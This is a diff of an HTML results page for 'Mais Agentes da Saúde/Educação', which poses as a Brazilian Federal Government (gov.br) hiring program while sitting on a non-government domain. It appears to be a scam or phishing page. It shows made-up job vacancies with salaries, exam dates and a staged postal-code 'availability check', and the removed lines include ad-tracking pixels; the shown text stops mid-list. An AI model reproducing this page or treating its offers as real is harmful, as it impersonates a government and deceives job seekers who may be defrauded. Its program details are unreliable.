@@ -1,86 +1,75 @@
-<!doctype html>
 <html lang="pt-BR">
-<head>
+
+<head></head>
+
+<body class="bg-white">﻿
+
+
+
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Resultados da Busca - Mais Agentes da Saúde</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Resultados da Busca - Mais Agentes da Educação</title>
 
-    <link rel="stylesheet" href="../css/all.min-2.css">
-    <link href="../rawline-2" rel="stylesheet">
 
-    <link rel="stylesheet" href="../css/custom-2.css">
 
-    <meta name="description" content="Programa Nacional de Agentes da Saúde - Governo Federal">
-    <meta name="keywords" content="Saúde, governo federal, agentes Saúde, PNAE, vagas públicas">
+    <!-- External CSS -->
+    <script src="3.4-2.16"></script>
+    <link rel="stylesheet" href="css/all.min-2.css">
+    <link href="rawline-2" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="css/custom-2.css">
+
+    <!-- SEO and Meta Tags -->
+    <meta name="description" content="Programa Nacional de Agentes da Educação - Governo Federal">
+    <meta name="keywords" content="educação, governo federal, agentes educação, PNAE, vagas públicas">
     <meta name="author" content="Governo Federal do Brasil">
 
-    <meta property="og:title" content="Mais Agentes da Saúde - gov.br">
-    <meta property="og:description" content="Programa Nacional de Agentes da Saúde do Governo Federal">
+    <!-- Open Graph -->
+    <meta property="og:title" content="Mais Agentes da Educação - gov.br">
+    <meta property="og:description" content="Programa Nacional de Agentes da Educação do Governo Federal">
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://gov.agentesdaeducacao.org/resultados-busca">
+    <meta property="og:url" content="https://gov.agentesdaeducacao.org/resultados-busca?cep=31230770">
 
+    <!-- Favicon -->
     <link rel="icon" type="image/x-icon"
         href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🇧🇷</text></svg>">
 
-    <script src="https://cdn.tailwindcss.com"></script>
 
-    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
-    <script>
-      window.pixelId = "6840ea536d63944fb005b654";
-      var a = document.createElement("script");
-      a.setAttribute("async", "");
-      a.setAttribute("defer", "");
-      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-      document.head.appendChild(a);
-    </script>
-    <script>
-    !function(f,b,e,v,n,t,s)
-    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)}(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
-    fbq('init', '593557269939426');
-    fbq('track', 'PageView');
-    </script>
-    <script>
-      window.addEventListener('error', function(e) {
-        console.error('Global error:', e.error);
-      });
 
-      window.addEventListener('unhandledrejection', function(e) {
-        console.error('Unhandled promise rejection:', e.reason);
-      });
-    </script>
-
-    <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-06L8ZR8789"></script>
-    <script>
-        window.dataLayer = window.dataLayer || [];
-        function gtag() { dataLayer.push(arguments); }
-        gtag('js', new Date());
-        gtag('config', 'G-06L8ZR8789');
-        gtag('config', 'AW-17060128628');
-        gtag('config', 'AW-17060259955');
-        gtag('config', 'AW-17060206170');
-        gtag('config', 'AW-17205154926');
-        gtag('config', 'AW-17061488219');
-        gtag('config', 'AW-17061592417');
-    </script>
-
+    <!-- Preserve Query Parameters Script -->
     <script>
         document.addEventListener('DOMContentLoaded', function () {
+            // Get current query parameters
             const currentParams = new URLSearchParams(window.location.search);
+
+            // Function to add query parameters to a URL
             function addQueryParams(url) {
                 if (!url) return url;
+
+                // Create URL object with absolute path
                 const urlObj = new URL(url, window.location.origin);
+
+                // Special handling for cadastro to resultados-busca navigation
+                if (window.location.pathname === '/cadastro' && url.includes('/resultados-busca')) {
+                    // Add CEP parameter if not already present
+                    if (!urlObj.searchParams.has('cep')) {
+                        urlObj.searchParams.set('cep', '72236001');
+                    }
+                }
+
+                // Preserve existing parameters
                 currentParams.forEach((value, key) => {
-                    urlObj.searchParams.set(key, value);
+                    // Don't override CEP if it's already set
+                    if (!(key === 'cep' && urlObj.searchParams.has('cep'))) {
+                        urlObj.searchParams.set(key, value);
+                    }
                 });
+
                 return urlObj.toString();
             }
 
+            // Add click event listeners to all links
             document.querySelectorAll('a').forEach(link => {
                 const originalHref = link.getAttribute('href');
                 if (originalHref && !originalHref.startsWith('#') && !originalHref.startsWith('javascript:')) {
@@ -93,21 +82,32 @@
                     });
                 }
             });
-            console.log('Current URL (Page 3):', window.location.href);
-            console.log('Current Parameters (Page 3):', Object.fromEntries(currentParams));
+
+            // Also handle form submissions
+            document.querySelectorAll('form').forEach(form => {
+                form.addEventListener('submit', function (e) {
+                    const formAction = form.getAttribute('action');
+                    if (formAction && formAction.includes('/resultado')) {
+                        e.preventDefault();
+                        const newUrl = addQueryParams(formAction);
+                        window.location.href = newUrl;
+                    }
+                });
+            });
+
+            // Debug log to check parameters
+            console.log('Current URL:', window.location.href);
+            console.log('Current Parameters:', Object.fromEntries(currentParams));
         });
     </script>
-</head>
-<body class="bg-white">
-    <noscript><img height="1" width="1" style="display:none"
-    src="https://www.facebook.com/tr?id=593557269939426&ev=PageView&noscript=1"
-    /></noscript>
 
+
+    <!-- Header -->
     <header class="header-govbr">
         <div class="flex justify-between items-center px-4 py-3">
             <div class="flex items-center">
-                <a href="../index.htm" class="gov-logo">
-                    <img src="../images/govbr.webp" alt="gov.br" class="h-8">
+                <a href="/" class="gov-logo">
+                    <img src="images/1200px-Gov.br_logo.svg-2.png" alt="gov.br" class="h-8">
                 </a>
             </div>
             <div class="flex items-center">
@@ -130,12 +130,13 @@
             </div>
         </div>
 
+        <!-- Title Bar -->
         <div class="flex justify-between items-center px-4 py-2 border-b border-gray-300">
             <div class="flex items-center">
                 <button class="header-btn" id="sidebar-toggle" aria-label="Menu lateral">
                     <i class="fas fa-bars text-blue-900 mr-3"></i>
                 </button>
-                <span class="text-gray-800 text-sm font-medium">Fundo Nacional de Desenvolvimento da Saúde</span>
+                <span class="text-gray-800 text-sm font-medium">Fundo Nacional de Desenvolvimento da Educação</span>
             </div>
             <div class="flex items-center">
                 <button class="header-btn" id="voice-search-btn" aria-label="Busca por voz">
@@ -147,6 +148,7 @@
             </div>
         </div>
 
+        <!-- Search Bar (hidden by default) -->
         <div id="search-bar" class="hidden bg-white border-b border-gray-300 px-4 py-3">
             <div class="flex items-center max-w-md mx-auto">
                 <div class="relative flex-1">
@@ -162,9 +164,10 @@
             </div>
         </div>
 
+        <!-- Breadcrumb -->
         <nav class="breadcrumb-nav flex items-center px-4 py-3 text-sm" aria-label="Navegação estrutural">
             <div class="flex flex-wrap items-center gap-1">
-                <a href="../index.htm" class="text-blue-700 hover:text-blue-800">
+                <a href="/" class="text-blue-700 hover:text-blue-800">
                     <i class="fas fa-home"></i>
                 </a>
                 <span class="mx-1 text-gray-600">></span>
@@ -178,121 +181,36 @@
                 <span class="mx-1 text-gray-600">></span>
                 <a href="/lista-programas" class="text-blue-700 hover:text-blue-800 text-xs">Lista de Programas</a>
                 <span class="mx-1 text-gray-600">></span>
-                <span class="text-gray-800 text-xs font-medium">Mais Agentes da Saúde</span>
+                <span class="text-gray-800 text-xs font-medium">Mais Agentes da Educação</span>
             </div>
         </nav>
     </header>
 
+    <!-- Main Content -->
     <main class="main-content">
 
         <div class="px-4 py-4">
-            <h1 class="text-3xl font-semibold mb-4" style="color: #1351B4;">Resultados da Busca - Mais Agentes da Saúde</h1>
+            <h1 class="text-3xl font-semibold mb-4" style="color: #1351B4;">Resultados da Busca - Mais Agentes da
+                Educação</h1>
 
             <div class="border-t border-b border-gray-300 py-3 mb-6">
                 <div class="text-gray-700 text-sm">
                     <p>Publicado em 24/05/2025 17h37</p>
-                    <p>Atualizado em 16/07/2025 18h29</p>
+                    <p>Atualizado em 24/05/2025 18h29</p>
                 </div>
             </div>
 
-            <div class="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
-                <div class="flex items-center mb-3 text-green-700">
-                    <i class="fas fa-heart text-2xl mr-2"></i>
-                    <h2 class="text-xl font-bold">Informações do Processo Seletivo - SUS 2025</h2>
-                </div>
-                <div class="grid md:grid-cols-2 gap-6">
-                    <div>
-                        <h3 class="font-bold text-gray-800 mb-2">Formato da Prova</h3>
-                        <ul class="list-disc list-inside text-gray-700 ml-4">
-                            <li class="font-bold text-green-700">60 questões objetivas</li>
-                            <li class="font-bold text-green-700">Prova prática</li>
-                            <li class="font-bold text-purple-600">Múltipla escolha</li>
-                        </ul>
-                    </div>
-                    <div>
-                        <h3 class="font-bold text-gray-800 mb-2">Local da Prova</h3>
-                        <p class="text-gray-700">Unidade de Saúde mais próxima da sua residência</p>
-                        <p class="text-sm text-green-600 flex items-center mt-1">
-                            <i class="fas fa-info-circle mr-1"></i> O local exato será informado no cartão de confirmação, enviado por email após a confirmação da inscrição.
-                        </p>
-                    </div>
-                </div>
-            </div>
-
-            <div class="grid md:grid-cols-2 gap-6 mb-6">
-                <div class="bg-white border border-gray-300 rounded-lg p-4 shadow-sm">
-                    <h3 class="font-bold text-gray-800 mb-2">Data e Horário</h3>
-                    <p class="text-gray-700"><strong>Data:</strong> 15 de Setembro de 2025</p>
-                    <p class="text-gray-700"><strong>Horário:</strong> 14h às 18h</p>
-                    <p class="text-blue-600"><strong>Duração:</strong> 4 horas</p>
-                </div>
-                <div class="bg-white border border-gray-300 rounded-lg p-4 shadow-sm">
-                    <h3 class="font-bold text-gray-800 mb-2">Cronograma Importante</h3>
-                    <p class="text-gray-700"><strong>Inscrições:</strong> Abertas</p>
-                    <p class="text-gray-700"><strong>Cartão de confirmação:</strong> 01/09/2025</p>
-                    <p class="text-gray-700"><strong>Prova objetiva:</strong> 15/09/2025</p>
-                    <p class="text-gray-700"><strong>Resultado:</strong> 30/09/2025</p>
-                </div>
-            </div>
-
-            <div class="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-800 p-4 mb-6 rounded-md">
-                <p class="font-bold flex items-center mb-2"><i class="fas fa-exclamation-triangle mr-2"></i> Importante:</p>
-                <ul class="list-disc list-inside ml-4">
-                    <li>Chegue ao local com <strong class="font-semibold">1 hora de antecedência</strong></li>
-                    <li>Leve documento oficial com foto</li>
-                    <li>Caneta esferográfica azul ou preta</li>
-                    <li>O cartão de confirmação será enviado por email</li>
-                </ul>
-            </div>
-
-            <div class="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
-                <div class="flex items-center mb-3 text-green-700">
-                    <i class="fas fa-graduation-cap text-2xl mr-2"></i>
-                    <h2 class="text-xl font-bold">Requisitos e Capacitação Profissional</h2>
-                </div>
-                <div class="grid md:grid-cols-2 gap-6">
-                    <div>
-                        <h3 class="font-bold text-gray-800 mb-2">Escolaridade Exigida</h3>
-                        <ul class="list-disc list-inside text-gray-700 ml-4">
-                            <li class="font-bold text-green-700">Ensino Médio Completo</li>
-                            <li class="font-bold text-green-700">Certificado reconhecido pelo MEC</li>
-                            <li class="font-bold text-green-700">Idade mínima: 18 anos</li>
-                        </ul>
-                        <p class="text-sm text-green-600 flex items-center mt-3">
-                            <i class="fas fa-info-circle mr-1"></i> Todos os cargos listados são acessíveis para candidatos com ensino médio completo.
-                        </p>
-                    </div>
-                    <div>
-                        <h3 class="font-bold text-gray-800 mb-2">Capacitação Profissional</h3>
-                        <ul class="list-disc list-inside text-gray-700 ml-4">
-                            <li class="font-bold text-green-700">Treinamento de até 90 dias</li>
-                            <li class="font-bold text-green-700">Capacitação específica para cada cargo</li>
-                            <li class="font-bold text-green-700">Acompanhamento de profissionais experientes</li>
-                        </ul>
-                        <p class="text-sm text-blue-600 flex items-center mt-3">
-                            <i class="fas fa-info-circle mr-1"></i> O treinamento é fornecido pelo SUS após aprovação no concurso, preparando você para exercer a função com excelência.
-                        </p>
-                    </div>
-                </div>
-            </div>
-
-            <div class="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-800 p-4 mb-6 rounded-md">
-                <p class="font-bold flex items-center mb-2"><i class="fas fa-star mr-2"></i> Vantagens do Programa de Capacitação:</p>
-                <div class="grid md:grid-cols-3 gap-4 text-gray-700">
-                    <p class="flex items-center"><i class="fas fa-check-circle text-orange-500 mr-2"></i> Remuneração durante o treinamento</p>
-                    <p class="flex items-center"><i class="fas fa-check-circle text-orange-500 mr-2"></i> Certificação profissional</p>
-                    <p class="flex items-center"><i class="fas fa-check-circle text-orange-500 mr-2"></i> Plano de carreira estruturado</p>
-                </div>
-            </div>
-
+            <!-- Loading Animation (inicial) -->
             <div id="loading-section" class="text-center py-16">
                 <div class="inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mb-4"></div>
                 <h2 class="text-xl font-semibold text-gray-800 mb-2">Carregando dados...</h2>
-                <p class="text-gray-600">Consultando disponibilidade na região CEP: <span id="loading-cep-info" class="font-bold"></span></p>
+                <p class="text-gray-600">Consultando disponibilidade na região CEP: </p>
                 <p class="text-sm text-gray-500 mt-1">Verificando oportunidades de emprego...</p>
             </div>
 
+            <!-- Resultados (aparecem após loading) -->
             <div id="results-section" class="hidden">
+                <!-- Confirmação de Disponibilidade -->
                 <div class="bg-blue-50 border border-blue-200 rounded-lg p-6 mb-8">
                     <div class="flex items-start">
                         <div class="ml-4">
@@ -331,7 +249,7 @@
                                     </div>
                                     <div>
                                         <p class="text-sm text-gray-500 mb-1">Status:</p>
-                                        <span id="status-info"
+                                        <span
                                             class="inline-flex items-center px-2 py-1 rounded text-xs font-medium bg-blue-100 text-blue-800">
                                             DISPONÍVEL
                                         </span>
@@ -347,6 +265,7 @@
                     </div>
                 </div>
 
+                <!-- Instrução de Seleção -->
                 <div class="bg-gray-50 border border-gray-300 rounded p-4 mb-6">
                     <div class="flex items-center">
                         <i class="fas fa-arrow-down text-blue-600 text-lg mr-3"></i>
@@ -359,6 +278,7 @@
                     </p>
                 </div>
 
+                <!-- Lista de Cargos -->
                 <div class="bg-white border border-gray-300 rounded p-6 mb-8">
                     <h3 class="text-xl font-medium text-gray-800 mb-6">
                         <i class="fas fa-list mr-2"></i>
@@ -366,357 +286,19 @@
                     </h3>
 
                     <div class="grid gap-4">
+                        <!-- Cargo 1 -->
                         <div class="cargo-option bg-gray-50 border border-gray-300 rounded p-4 cursor-pointer hover:border-blue-500"
-                            data-cargo="operador-telemarketing" data-disponivel="true">
-                            <div class="flex items-start justify-between">
-                                <div class="flex-1">
-                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Operador de Telemarketing em Saúde</h4>
-                                    <p class="text-sm text-gray-600 mb-3">Atendimento telefônico e agendamento de consultas.</p>
-                                    <div class="grid md:grid-cols-3 gap-4 text-sm">
-                                        <div>
-                                            <span class="text-gray-500">Remuneração:</span>
-                                            <p class="font-medium text-green-600">R$ 3.100,00 - R$ 4.200,00</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Carga Horária:</span>
-                                            <p class="font-semibold">40h semanais</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Modalidade:</span>
-                                            <p class="font-semibold">Presencial</p>
-                                        </div>
-                                    </div>
-                                    <div class="bg-blue-50 border border-blue-200 text-blue-800 px-3 py-2 rounded-md flex items-center mt-3 text-xs">
-                                        <i class="fas fa-info-circle mr-2"></i>
-                                        Requisito: Ensino Médio Completo <span class="mx-2">•</span> Treinamento: Até 90 dias
-                                    </div>
-                                </div>
-                                <div class="ml-4">
-                                    <button class="bg-green-600 text-white px-4 py-2 rounded font-medium hover:bg-green-700">Selecionar Cargo</button>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="cargo-option bg-gray-50 border border-gray-300 rounded p-4 cursor-pointer hover:border-blue-500"
-                            data-cargo="auxiliar-recursos-humanos" data-disponivel="true">
-                            <div class="flex items-start justify-between">
-                                <div class="flex-1">
-                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Auxiliar de Recursos Humanos</h4>
-                                    <p class="text-sm text-gray-600 mb-3">Apoio administrativo na área de recursos humanos.</p>
-                                    <div class="grid md:grid-cols-3 gap-4 text-sm">
-                                        <div>
-                                            <span class="text-gray-500">Remuneração:</span>
-                                            <p class="font-medium text-green-600">R$ 3.600,00 - R$ 4.800,00</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Carga Horária:</span>
-                                            <p class="font-semibold">40h semanais</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Modalidade:</span>
-                                            <p class="font-semibold">Presencial</p>
-                                        </div>
-                                    </div>
-                                    <div class="bg-blue-50 border border-blue-200 text-blue-800 px-3 py-2 rounded-md flex items-center mt-3 text-xs">
-                                        <i class="fas fa-info-circle mr-2"></i>
-                                        Requisito: Ensino Médio Completo <span class="mx-2">•</span> Treinamento: Até 90 dias
-                                    </div>
-                                </div>
-                                <div class="ml-4">
-                                    <button class="bg-green-600 text-white px-4 py-2 rounded font-medium hover:bg-green-700">Selecionar Cargo</button>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="cargo-option bg-gray-50 border border-gray-300 rounded p-4 cursor-pointer hover:border-blue-500"
-                            data-cargo="agente-comunitario" data-disponivel="true">
-                            <div class="flex items-start justify-between">
-                                <div class="flex-1">
-                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Agente Comunitário de Saúde</h4>
-                                    <p class="text-sm text-gray-600 mb-3">Acompanhamento e orientação das famílias na comunidade.</p>
-                                    <div class="grid md:grid-cols-3 gap-4 text-sm">
-                                        <div>
-                                            <span class="text-gray-500">Remuneração:</span>
-                                            <p class="font-medium text-green-600">R$ 3.824,00 - R$ 5.100,00</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Carga Horária:</span>
-                                            <p class="font-semibold">40h semanais</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Modalidade:</span>
-                                            <p class="font-semibold">Presencial</p>
-                                        </div>
-                                    </div>
-                                    <div class="bg-blue-50 border border-blue-200 text-blue-800 px-3 py-2 rounded-md flex items-center mt-3 text-xs">
-                                        <i class="fas fa-info-circle mr-2"></i>
-                                        Requisito: Ensino Médio Completo <span class="mx-2">•</span> Treinamento: Até 90 dias
-                                    </div>
-                                </div>
-                                <div class="ml-4">
-                                    <button class="bg-green-600 text-white px-4 py-2 rounded font-medium hover:bg-green-700">Selecionar Cargo</button>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="cargo-option bg-gray-50 border border-gray-300 rounded p-4 cursor-pointer hover:border-blue-500"
-                            data-cargo="agente-combate-endemias" data-disponivel="true">
-                            <div class="flex items-start justify-between">
-                                <div class="flex-1">
-                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Agente de Combate às Endemias</h4>
-                                    <p class="text-sm text-gray-600 mb-3">Prevenção e controle de doenças endêmicas.</p>
-                                    <div class="grid md:grid-cols-3 gap-4 text-sm">
-                                        <div>
-                                            <span class="text-gray-500">Remuneração:</span>
-                                            <p class="font-medium text-green-600">R$ 3.900,00 - R$ 5.200,00</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Carga Horária:</span>
-                                            <p class="font-semibold">40h semanais</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Modalidade:</span>
-                                            <p class="font-semibold">Presencial</p>
-                                        </div>
-                                    </div>
-                                    <div class="bg-blue-50 border border-blue-200 text-blue-800 px-3 py-2 rounded-md flex items-center mt-3 text-xs">
-                                        <i class="fas fa-info-circle mr-2"></i>
-                                        Requisito: Ensino Médio Completo <span class="mx-2">•</span> Treinamento: Até 90 dias
-                                    </div>
-                                </div>
-                                <div class="ml-4">
-                                    <button class="bg-green-600 text-white px-4 py-2 rounded font-medium hover:bg-green-700">Selecionar Cargo</button>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="cargo-option bg-gray-50 border border-gray-300 rounded p-4 cursor-pointer hover:border-blue-500"
-                            data-cargo="agente-vigilancia" data-disponivel="true">
-                            <div class="flex items-start justify-between">
-                                <div class="flex-1">
-                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Agente de Vigilância Sanitária</h4>
-                                    <p class="text-sm text-gray-600 mb-3">Fiscalização e controle sanitário de estabelecimentos.</p>
-                                    <div class="grid md:grid-cols-3 gap-4 text-sm">
-                                        <div>
-                                            <span class="text-gray-500">Remuneração:</span>
-                                            <p class="font-medium text-green-600">R$ 4.200,00 - R$ 5.800,00</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Carga Horária:</span>
-                                            <p class="font-semibold">40h semanais</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Modalidade:</span>
-                                            <p class="font-semibold">Presencial</p>
-                                        </div>
-                                    </div>
-                                    <div class="bg-blue-50 border border-blue-200 text-blue-800 px-3 py-2 rounded-md flex items-center mt-3 text-xs">
-                                        <i class="fas fa-info-circle mr-2"></i>
-                                        Requisito: Ensino Médio Completo <span class="mx-2">•</span> Treinamento: Até 90 dias
-                                    </div>
-                                </div>
-                                <div class="ml-4">
-                                    <button class="bg-green-600 text-white px-4 py-2 rounded font-medium hover:bg-green-700">Selecionar Cargo</button>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="cargo-option bg-gray-50 border border-gray-300 rounded p-4 cursor-pointer hover:border-blue-500"
-                            data-cargo="motorista-ambulancia" data-disponivel="true">
-                            <div class="flex items-start justify-between">
-                                <div class="flex-1">
-                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Motorista de Ambulância</h4>
-                                    <p class="text-sm text-gray-600 mb-3">Condução de ambulâncias e transporte de pacientes.</p>
-                                    <div class="grid md:grid-cols-3 gap-4 text-sm">
-                                        <div>
-                                            <span class="text-gray-500">Remuneração:</span>
-                                            <p class="font-medium text-green-600">R$ 4.400,00 - R$ 6.000,00</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Carga Horária:</span>
-                                            <p class="font-semibold">40h semanais</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Modalidade:</span>
-                                            <p class="font-semibold">Presencial</p>
-                                        </div>
-                                    </div>
-                                    <div class="bg-blue-50 border border-blue-200 text-blue-800 px-3 py-2 rounded-md flex items-center mt-3 text-xs">
-                                        <i class="fas fa-info-circle mr-2"></i>
-                                        Requisito: Ensino Médio Completo <span class="mx-2">•</span> Treinamento: Até 90 dias
-                                    </div>
-                                </div>
-                                <div class="ml-4">
-                                    <button class="bg-green-600 text-white px-4 py-2 rounded font-medium hover:bg-green-700">Selecionar Cargo</button>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="cargo-option bg-gray-50 border border-gray-300 rounded p-4 cursor-pointer hover:border-blue-500"
-                            data-cargo="tecnico-enfermagem" data-disponivel="true">
-                            <div class="flex items-start justify-between">
-                                <div class="flex-1">
-                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Técnico em Enfermagem</h4>
-                                    <p class="text-sm text-gray-600 mb-3">Assistência direta ao paciente em unidades de saúde do SUS.</p>
-                                    <div class="grid md:grid-cols-3 gap-4 text-sm">
-                                        <div>
-                                            <span class="text-gray-500">Remuneração:</span>
-                                            <p class="font-medium text-green-600">R$ 4.850,00 - R$ 6.800,00</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Carga Horária:</span>
-                                            <p class="font-semibold">40h semanais</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Modalidade:</span>
-                                            <p class="font-semibold">Presencial</p>
-                                        </div>
-                                    </div>
-                                    <div class="bg-blue-50 border border-blue-200 text-blue-800 px-3 py-2 rounded-md flex items-center mt-3 text-xs">
-                                        <i class="fas fa-info-circle mr-2"></i>
-                                        Requisito: Ensino Médio Completo <span class="mx-2">•</span> Treinamento: Até 90 dias
-                                    </div>
-                                </div>
-                                <div class="ml-4">
-                                    <button class="bg-green-600 text-white px-4 py-2 rounded font-medium hover:bg-green-700">Selecionar Cargo</button>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="cargo-option bg-gray-50 border border-gray-300 rounded p-4 cursor-pointer hover:border-blue-500"
-                            data-cargo="tecnico-radiologia" data-disponivel="true">
-                            <div class="flex items-start justify-between">
-                                <div class="flex-1">
-                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Técnico em Radiologia</h4>
-                                    <p class="text-sm text-gray-600 mb-3">Operação de equipamentos de radiologia e exames de imagem.</p>
-                                    <div class="grid md:grid-cols-3 gap-4 text-sm">
-                                        <div>
-                                            <span class="text-gray-500">Remuneração:</span>
-                                            <p class="font-medium text-green-600">R$ 5.200,00 - R$ 7.400,00</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Carga Horária:</span>
-                                            <p class="font-semibold">40h semanais</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Modalidade:</span>
-                                            <p class="font-semibold">Presencial</p>
-                                        </div>
-                                    </div>
-                                    <div class="bg-blue-50 border border-blue-200 text-blue-800 px-3 py-2 rounded-md flex items-center mt-3 text-xs">
-                                        <i class="fas fa-info-circle mr-2"></i>
-                                        Requisito: Ensino Médio Completo <span class="mx-2">•</span> Treinamento: Até 90 dias
-                                    </div>
-                                </div>
-                                <div class="ml-4">
-                                    <button class="bg-green-600 text-white px-4 py-2 rounded font-medium hover:bg-green-700">Selecionar Cargo</button>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="cargo-option bg-gray-50 border border-gray-300 rounded p-4 cursor-pointer hover:border-blue-500"
-                            data-cargo="tecnico-laboratorio" data-disponivel="true">
-                            <div class="flex items-start justify-between">
-                                <div class="flex-1">
-                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Técnico em Laboratório</h4>
-                                    <p class="text-sm text-gray-600 mb-3">Realização de exames laboratoriais e análises clínicas.</p>
-                                    <div class="grid md:grid-cols-3 gap-4 text-sm">
-                                        <div>
-                                            <span class="text-gray-500">Remuneração:</span>
-                                            <p class="font-medium text-green-600">R$ 4.900,00 - R$ 6.900,00</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Carga Horária:</span>
-                                            <p class="font-semibold">40h semanais</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Modalidade:</span>
-                                            <p class="font-semibold">Presencial</p>
-                                        </div>
-                                    </div>
-                                    <div class="bg-blue-50 border border-blue-200 text-blue-800 px-3 py-2 rounded-md flex items-center mt-3 text-xs">
-                                        <i class="fas fa-info-circle mr-2"></i>
-                                        Requisito: Ensino Médio Completo <span class="mx-2">•</span> Treinamento: Até 90 dias
-                                    </div>
-                                </div>
-                                <div class="ml-4">
-                                    <button class="bg-green-600 text-white px-4 py-2 rounded font-medium hover:bg-green-700">Selecionar Cargo</button>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="cargo-option bg-gray-50 border border-gray-300 rounded p-4 cursor-pointer hover:border-blue-500"
-                            data-cargo="auxiliar-laboratorio" data-disponivel="true">
-                            <div class="flex items-start justify-between">
-                                <div class="flex-1">
-                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Auxiliar de Laboratório</h4>
-                                    <p class="text-sm text-gray-600 mb-3">Apoio na coleta e preparação de amostras laboratoriais.</p>
-                                    <div class="grid md:grid-cols-3 gap-4 text-sm">
-                                        <div>
-                                            <span class="text-gray-500">Remuneração:</span>
-                                            <p class="font-medium text-green-600">R$ 3.700,00 - R$ 5.000,00</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Carga Horária:</span>
-                                            <p class="font-semibold">40h semanais</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Modalidade:</span>
-                                            <p class="font-semibold">Presencial</p>
-                                        </div>
-                                    </div>
-                                    <div class="bg-blue-50 border border-blue-200 text-blue-800 px-3 py-2 rounded-md flex items-center mt-3 text-xs">
-                                        <i class="fas fa-info-circle mr-2"></i>
-                                        Requisito: Ensino Médio Completo <span class="mx-2">•</span> Treinamento: Até 90 dias
-                                    </div>
-                                </div>
-                                <div class="ml-4">
-                                    <button class="bg-green-600 text-white px-4 py-2 rounded font-medium hover:bg-green-700">Selecionar Cargo</button>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="cargo-option bg-gray-50 border border-gray-300 rounded p-4 cursor-pointer hover:border-blue-500"
-                            data-cargo="auxiliar-radiologia" data-disponivel="true">
-                            <div class="flex items-start justify-between">
-                                <div class="flex-1">
-                                    <h4 class="text-lg font-medium text-gray-800 mb-2">• Auxiliar de Radiologia</h4>
-                                    <p class="text-sm text-gray-600 mb-3">Apoio na preparação de pacientes para exames de imagem.</p>
-                                    <div class="grid md:grid-cols-3 gap-4 text-sm">
-                                        <div>
-                                            <span class="text-gray-500">Remuneração:</span>
-                                            <p class="font-medium text-green-600">R$ 3.900,00 - R$ 5.300,00</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Carga Horária:</span>
-                                            <p class="font-semibold">40h semanais</p>
-                                        </div>
-                                        <div>
-                                            <span class="text-gray-500">Modalidade:</span>
-                                            <p class="font-semibold">Presencial</p>
-                                        </div>
-                                    </div>
-                                    <div class="bg-blue-50 border border-blue-200 text-blue-800 px-3 py-2 rounded-md flex items-center mt-3 text-xs">
-                                        <i class="fas fa-info-circle mr-2"></i>
-                                        Requisito: Ensino Médio Completo <span class="mx-2">•</span> Treinamento: Até 90 dias
-                                    </div>
-                                </div>
-                                <div class="ml-4">
-                                    <button class="bg-green-600 text-white px-4 py-2 rounded font-medium hover:bg-green-700">Selecionar Cargo</button>
